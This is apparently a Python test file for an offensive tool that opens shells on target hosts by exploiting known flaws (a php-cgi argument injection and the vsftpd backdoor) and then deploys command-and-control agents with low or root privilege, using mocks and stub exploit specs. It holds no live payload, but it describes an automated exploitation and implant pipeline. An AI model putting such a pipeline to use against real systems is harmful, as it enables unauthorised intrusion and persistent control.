"""Dual C2 client profiles (lowpriv/root) contract tests."""

from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

_REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_REPO))
sys.path.insert(0, str(_REPO / "modules"))

from modules import atomic_exploit_bridge as bridge  # noqa: E402
from modules import c2_agent as agent  # noqa: E402

sys.modules.setdefault("atomic_exploit_bridge", bridge)

_KEY = "ab" * 32


def _specs_dir() -> str:
    tmp = tempfile.mkdtemp()
    low = Path(tmp) / "ms2_php_cgi_arg_injection.yaml"
    root = Path(tmp) / "vsftpd_backdoor.yaml"
    low.write_text(
        "id: ms2_php_cgi_arg_injection\nmitre_id: T1190\ncve: CVE-2024-4577\n"
        "title: php-cgi arg injection\nseverity: critical\nconfidence: 0.99\n"
        "platforms: [linux]\nservices: [http]\nexec:\n"
        "  trigger: 'x'\n  shell_port: 9888\n  probe: id\n  timeout: 10\ncommands:\n"
        "  - run: id\n    timeout: 10\n",
        encoding="utf-8",
    )
    root.write_text(
        "id: vsftpd_backdoor\nmitre_id: T1190\ncve: CVE-2011-2523\n"
        "title: vsftpd backdoor\nseverity: critical\nconfidence: 0.9\n"
        "platforms: [linux]\nservices: [ftp]\nexec:\n"
        "  trigger: 'x'\n  shell_port: 6200\n  probe: id\n  timeout: 10\ncommands:\n"
        "  - run: id\n    timeout: 10\n",
        encoding="utf-8",
    )
    return tmp


class ClientIdProfiles(unittest.TestCase):
    def test_default_lowpriv_id(self):
        self.assertEqual(agent.client_id_for("10.0.0.5"), "msf-10-0-0-5")

    def test_root_id_suffix(self):
        self.assertEqual(agent.client_id_for("10.0.0.5", privilege="root"), "msf-10-0-0-5-root")

    def test_invalid_privilege_rejected(self):
        with self.assertRaises(ValueError):
            agent.client_id_for("10.0.0.5", privilege="sid")

    def test_ids_validate(self):
        for priv in ("lowpriv", "root", ""):
            cid = agent.client_id_for("172.17.0.2", privilege=priv)
            self.assertEqual(agent.validate_client_id(cid), cid)


class BuildAgentProfiles(unittest.TestCase):
    def test_lowpriv_default(self):
        text = agent.build_agent("http://1.2.3.4:8080", "msf-1-2-3-4", _KEY)
        self.assertIn('ID = "msf-1-2-3-4"', text)
        self.assertNotIn("msf-1-2-3-4-root", text)

    def test_root_profile(self):
        text = agent.build_agent("http://1.2.3.4:8080", "msf-1-2-3-4", _KEY, privilege="root")
        self.assertIn('ID = "msf-1-2-3-4-root"', text)

    def test_invalid_privilege(self):
        with self.assertRaises(ValueError):
            agent.build_agent("http://1.2.3.4:8080", "msf-1-2-3-4", _KEY, privilege="god")


class OpenShellPrivilegeFilter(unittest.TestCase):
    def test_root_request_excludes_lowpriv_specs(self):
        tmp = _specs_dir()
        with patch.object(bridge, "ensure_session", return_value=None):
            spec = bridge.open_shell("10.0.0.9", exploits_dir=tmp, privilege="root", attempts=1)
        self.assertIsNotNone(spec)
        self.assertEqual(spec.id, "vsftpd_backdoor")

    def test_lowpriv_accepts_best_ranked(self):
        tmp = _specs_dir()
        with patch.object(bridge, "ensure_session", return_value=None):
            spec = bridge.open_shell("10.0.0.9", exploits_dir=tmp, attempts=1)
        self.assertIsNotNone(spec)
        self.assertEqual(spec.id, "ms2_php_cgi_arg_injection")

    def test_unknown_privilege(self):
        with self.assertRaises(ValueError):
            bridge.open_shell("10.0.0.9", privilege="demi")


class DeployProfiles(unittest.TestCase):
    def test_unknown_privilege(self):
        with self.assertRaises(ValueError):
            agent.deploy("10.0.0.9", "http://127.0.0.1:8080", privilege="ghost")

    def test_root_without_root_primitive(self):
        with patch.object(agent, "_ensure_key", return_value=_KEY):
            with patch.object(bridge, "open_shell", return_value=None) as fake_open:
                result = agent.deploy("10.0.0.9", "http://127.0.0.1:8080", privilege="root")
        self.assertFalse(result["deployed"])
        self.assertEqual(result["reason"], "no root-capable shell primitive")
        self.assertEqual(result["client_id"], "msf-10-0-0-9-root")
        self.assertEqual(fake_open.call_args.kwargs.get("privilege"), "root")


class DeployStagingSecurity(unittest.TestCase):
    """Private mktemp staging: no predictable /tmp path, hash-gated launch."""

    class _FakeSpec:
        id = "vsftpd_backdoor"
        exec_timeout = 10

    def _fake_session(self, commands: list):
        class _FakeSession:
            def run(self, cmd, timeout=None):
                commands.append(cmd)
                if "mktemp -d" in cmd:
                    return "/tmp/.lzdep.Aa1Bb2Cc3Dd\n"
                if "wc -c" in cmd:
                    return "12\n#!/usr/bin/env python"
                if "stat -c" in cmd:
                    return "0\n"
                if "grep -c" in cmd:
                    return "1\n"
                return "\n"

        return _FakeSession()

    def test_deploy_never_uses_predictable_tmp_path(self):
        commands = []
        with patch.object(agent, "_ensure_key", return_value=_KEY):
            with patch.object(bridge, "open_shell", return_value=self._FakeSpec()):
                with patch.object(bridge, "ensure_session", return_value=self._fake_session(commands)):
                    with patch.object(bridge, "close_sessions", return_value=1):
                        result = agent.deploy("10.0.0.9", "http://127.0.0.1:8080", privilege="root")
        self.assertTrue(result["deployed"])
        joined = "\n".join(commands)
        self.assertIn("mktemp -d /tmp/.lzdep.", joined)
        self.assertNotIn("/tmp/.sysagent", joined)
        self.assertNotIn("chmod +x", joined)

    def test_deploy_hash_gates_launch(self):
        commands = []
        with patch.object(agent, "_ensure_key", return_value=_KEY):
            with patch.object(bridge, "open_shell", return_value=self._FakeSpec()):
                with patch.object(bridge, "ensure_session", return_value=self._fake_session(commands)):
                    with patch.object(bridge, "close_sessions", return_value=1):
                        agent.deploy("10.0.0.9", "http://127.0.0.1:8080", privilege="root")
        joined = "\n".join(commands)
        self.assertIn("sha256sum --check --status", joined)
        self.assertIn("chmod 700", joined)
        self.assertIn("stat -c '%u'", joined)
        self.assertIn("rm -rf /tmp/.lzdep.", joined)

    def test_deploy_aborts_when_staging_not_root_owned(self):
        class _ForeignSession:
            def run(self, cmd, timeout=None):
                if "mktemp -d" in cmd:
                    return "/tmp/.lzdep.Aa1Bb2Cc3Dd\n"
                if "stat -c" in cmd:
                    return "1000\n"
                return "\n"

        with patch.object(agent, "_ensure_key", return_value=_KEY):
            with patch.object(bridge, "open_shell", return_value=self._FakeSpec()):
                with patch.object(bridge, "ensure_session", return_value=_ForeignSession()):
                    with patch.object(bridge, "close_sessions", return_value=1):
                        result = agent.deploy("10.0.0.9", "http://127.0.0.1:8080", privilege="root")
        self.assertFalse(result["deployed"])
        self.assertIn("not root-owned", result["reason"])

    def test_deploy_aborts_without_private_dir(self):
        class _BareSession:
            def run(self, cmd, timeout=None):
                return "[error] mktemp refused\n"

        with patch.object(agent, "_ensure_key", return_value=_KEY):
            with patch.object(bridge, "open_shell", return_value=self._FakeSpec()):
                with patch.object(bridge, "ensure_session", return_value=_BareSession()):
                    with patch.object(bridge, "close_sessions", return_value=1):
                        result = agent.deploy("10.0.0.9", "http://127.0.0.1:8080", privilege="root")
        self.assertFalse(result["deployed"])
        self.assertEqual(result["reason"], "private staging dir unavailable")

    def test_agent_files_have_unique_names(self):
        import re

        text = agent.build_agent("http://1.2.3.4:8080", "msf-1-2-3-4", _KEY, privilege="root")
        self.assertNotIn("/tmp/.agent.log", text)
        self.assertNotIn('"/tmp/.bct"', text)
        self.assertNotIn('"/tmp/.bpt"', text)
        match = re.search(r'FILEUNIQ = "([0-9a-f]{16})"', text)
        self.assertIsNotNone(match)


if __name__ == "__main__":
    unittest.main()
